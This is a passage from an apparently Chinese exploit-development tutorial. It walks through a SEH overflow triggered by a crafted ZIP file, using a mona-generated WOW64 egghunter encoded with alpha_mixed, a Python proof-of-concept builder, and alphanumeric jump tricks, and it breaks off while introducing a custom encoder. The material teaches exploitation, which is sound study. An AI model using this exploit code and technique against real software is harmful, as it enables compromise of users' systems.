微软雅黑, &quot;Microsoft YaHei&quot;;">shellcode去哪里了？</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">好的，我们分析一下，看看我们进展情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们设法让它崩溃了，并且能控制SEH，这非常好！ 问题是我们的有效载荷受制于一个非常有限的字符集，并且因为我们必须使用NULL字节的地址来调用POP-POP-RET指令，我们的有效载荷被切断了，并且留给shellcode的空间也不是很大。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么它究竟有多大呢？ 别忘了，为了获得SEH，我们还在有效负载开始部分进行了填充：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01d0028dcb72756e3f.png" title="t0151ff224bd6e5c81d.png" alt="http://p6.qhimg.com/t0151ff224bd6e5c81d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么我们有多少空间呢？ 共计292个字节。 不幸的是，这些是不够的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不过，这个问题好像可以用egghunter来解决！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Egghunter只是一堆指令，在程序的内存空间中查找一个特定的、已知的字节序列（“egg”），一旦找到，将重定向到该区域。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样我们就不用担心我们的shellcode在哪里结束了，我们可以调用eghtunter例程，它会为我们找到它们！&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">听起来不错，但下一个问题是，有效载荷的“截止”部分真的位于在内存中吗？ 我们来看看吧。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们生成3764个单字符的模版（在NULL字节之后填写我们的有效负载），并用它替换现有的A。</span></p><pre class="brush:plain;toolbar:false">！mona&nbsp;pc&nbsp;3764</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们触发崩溃，当我们得到我们的第一个异常时，不要将异常传递给程序，而是调用以下命令来在内存中搜索以前生成的模版：</span></p><pre class="brush:plain;toolbar:false">！mona&nbsp;findmsp</pre><p style="text-align:center"><img src="http://p3.qhimg.com/t01735607be87e80cc7.png" title="t01b58306dd2c487dd6.png" alt="http://p7.qhimg.com/t01b58306dd2c487dd6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">太棒了！ 有效载荷的整个“截断”部分仍然在内存中，所以我们应该能够成功地使用egghunter来获取我们的shellcode。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Egghunter</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们能够使用egghunter来获取我们的shellcode，但是我们只有292个字节可供使用。实际上，我们可以用292字节空间做许多事情，但是别忘了，我们只能使用非常有限的字符集。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们试着用metasploit的x86 / alpha_mixed编码器对egghunter进行编码，看看在这之后还剩下多少空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，让我们生成egghunter有效载荷。 请记住，我们正在使用64位操作系统，因此还需要使用相应的egghunter例程（有关更多详细信息，请访问<a href="https://www.corelan.be/index.php/2011/11/18/WOW64-egghunter/" _src="https://www.corelan.be/index.php/2011/11/18/WOW64-egghunter/">https://www.corelan.be/index.php/2011/11/18/WOW64-egghunter/</a>&nbsp; &nbsp;）：</span></p><pre class="brush:plain;toolbar:false">！mona&nbsp;egghunter&nbsp;-wow64</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">将生成的字节复制到文本文件中，并使用xxd将其转换为二进制文件：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;cat&nbsp;egghunter-wow64.txt&nbsp;
+31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
+#&nbsp;cat&nbsp;egghunter-wow64.txt&nbsp;|&nbsp;xxd&nbsp;-r&nbsp;-p&nbsp;&gt;&nbsp;egghunter-wow64.bin</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们需要让编码器确保只用ASCII可打印字符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;msfencode&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;bufferregister=eax&nbsp;-i&nbsp;egghunter-wow64.bin
+[*]&nbsp;x86/alpha_mixed&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;146&nbsp;(iteration=1)
+buf&nbsp;=&nbsp;
+&quot;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;&nbsp;+
+&quot;\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30&quot;&nbsp;+
+&quot;\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42&quot;&nbsp;+
+&quot;\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b&quot;&nbsp;+
+&quot;\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36&quot;&nbsp;+
+&quot;\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a&quot;&nbsp;+
+&quot;\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74&quot;&nbsp;+
+&quot;\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44&quot;&nbsp;+
+&quot;\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b&quot;&nbsp;+
+&quot;\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51&quot;&nbsp;+
+&quot;\x6b\x4f\x79\x77\x41\x41&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意：我已经使用bufferedregister = eax选项，这是因为编码器需要找到它在内存中的位置，以便能够对有效载荷进行解码。 最初，负责该项工作的例程不在ASCII可打印的字符集中，因此会破坏我们的有效载荷。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指定bufferregister选项基本上就是告诉编码器不用担心如何在内存中找到自己的位置，我们会事先做好这件事情，我们将其地址放在EAX寄存器中。 这样，我们的编码后的egghunter就是纯ASCII字符（更多关于生成字母数字shellcode的信息可以在这里找到）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们更新我们的PoC漏洞利用代码，以反映我们迄今为止所做的工作的成效。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+header_1&nbsp;=&nbsp;(&quot;\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00&quot;)
+header_2&nbsp;=&nbsp;(&quot;\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00&quot;
+&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;)
+header_3&nbsp;=&nbsp;(&quot;\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00&quot;
+&quot;\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00&quot;)
+print&nbsp;&quot;[+]&nbsp;Building&nbsp;PoC..&quot;
+max_size&nbsp;=&nbsp;4064
+nseh_offset&nbsp;=&nbsp;292
+#&nbsp;msfencode&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;bufferregister=eax&nbsp;-i&nbsp;egghunter-wow64.bin
+#&nbsp;[*]&nbsp;x86/alpha_mixed&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;146&nbsp;(iteration=1)
+egghunter&nbsp;=&nbsp;(&quot;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;
+&quot;\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30&quot;
+&quot;\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42&quot;
+&quot;\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b&quot;
+&quot;\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36&quot;
+&quot;\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a&quot;
+&quot;\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74&quot;
+&quot;\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44&quot;
+&quot;\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b&quot;
+&quot;\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51&quot;
+&quot;\x6b\x4f\x79\x77\x41\x41&quot;)
+payload&nbsp;=&nbsp;egghunter
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;BBBB&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;\x33\x28\x42\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+payload&nbsp;+=&nbsp;&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev&quot;
+payload&nbsp;+=&nbsp;&quot;.txt&quot;
+print&nbsp;&quot;[+]&nbsp;Length&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(len(payload))
+exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3
+mefile&nbsp;=&nbsp;open(&#39;cst.zip&#39;,&#39;w&#39;);
+mefile.write(exploit);
+mefile.close()
+print&nbsp;&quot;[+]&nbsp;Exploit&nbsp;complete!&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">让我们触发崩溃，将控制权传递给该程序并执行POP-POP-RET指令。 之后，在CPU窗口中向上滚动，寻找egghunter有效载荷和一组EC ECX指令（代表字符A）的结束位置。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01749569873a64387a.png" title="t01be89f7c8c6e6740f.png" alt="http://p6.qhimg.com/t01be89f7c8c6e6740f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好的，看起来像是在那里，它似乎也是正确的:没有使用不符合要求的字符！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">跳转回来</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们还有更多的事情需要考虑——这里最重要的一点是，我们需要把egghunter的地址放在EAX中，然后跳转到那里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们如何在空间有限的情况下做到这一点？ 首先，我们有多少空间？ 简单计算一下就知道是146字节（nseh偏移减去egghunter的大小）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">146字节可以做什么？ 我们只需要写几个指令，但是它们必须属于允许使用的有限的字符集。 在这种情况下，我们不能使用已经用于egghunter的通用编码器，因为我们根本没有足够的空间来满足它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以，我们需要创建自己的编码器！ 这听起来很让人头疼，但实际上比看起来要简单得多。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们来看看目前在程序中的位置。&nbsp;</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01d92e96ae5113865c.png" title="t01b9e127acbd07dfcb.png" alt="http://p8.qhimg.com/t01b9e127acbd07dfcb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们只有4个字节，可由我们支配用来跳回有效载荷并开始写定制的编码器。同时，这4个字节最好是字母数字。 幸运的是，有多个指令可供使用，特别是在那些情况下！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这方面，可以参考TheColonial分享的相关技巧：http://buffered.io/posts/jumping-with-bad-chars/。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">简而言之，我们可以简单地使用JO和JNO指令来调用近转移指令到我们的有效载荷。 但我们能跳多远？ 通过用一些允许的字符的包裹后，我发现一些坏的字符会被转换为A2，它转换成十进制就是92，这应该能给我们提供足够的空间，以创建我们的自定义编码器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们用metasm生成所需的操作码，并将它们添加到我们的有效载荷中，用于代替nSEH。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">metasm&nbsp;&gt;&nbsp;jno&nbsp;$-99
+&quot;\x71\x9b&quot;
+metasm&nbsp;&gt;&nbsp;jo&nbsp;$-99
+&quot;\x70\x9b&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意：\ x9b（-99），因为这是一个不符合要求的字符，所以实际上将转换为\ xa2（-92）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们的PoC部分应该如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">payload&nbsp;=&nbsp;egghunter
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;\x71\x9b\x70\x9b&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH:&nbsp;jno&nbsp;$-99;&nbsp;jo&nbsp;$-99&nbsp;==&gt;&nbsp;9b&nbsp;will&nbsp;actually&nbsp;be&nbsp;converted&nbsp;to&nbsp;A2,&nbsp;which&nbsp;is&nbsp;$-92
+payload&nbsp;+=&nbsp;&quot;\x33\x28\x42\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+payload&nbsp;+=&nbsp;pattern&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pattern&nbsp;to&nbsp;look&nbsp;for&nbsp;in&nbsp;memory
+payload&nbsp;+=&nbsp;&quot;.txt&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">让我们触发崩溃，将执行权传递给程序，单步调试POP-POP-RET指令，观察单步调试JNO / JO指令时会发生什么。&nbsp;</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t015152176586a2c4b4.png" title="t01db5a6e11f726460d.png" alt="http://p3.qhimg.com/t01db5a6e11f726460d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">令人惊奇的是，这次跳转到了我们的有效载荷！ 现在，创建自定义编码器，编写指令，跳转到egg hunting例程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">定制编码器</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了跳到eghunter，我们需要写许多条指令，因为不使用“坏”字符的话，就没有直接的方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要解决这个问题，我们需要执行以下操作：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">找出我们想要写的指令的操作代码</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">使用简单的数学指令（即ADD和SUB），通过允许的字符将来自上述步骤的操作码的值放入我们选择的寄存器（例如EAX）中</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">我们将这个寄存器的值写入堆栈，从而将我们想要的指令写入ESP指向的内存区域</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">听起来很复杂？ 但实际上并不是那么糟糕。&nbsp;</span></p><p 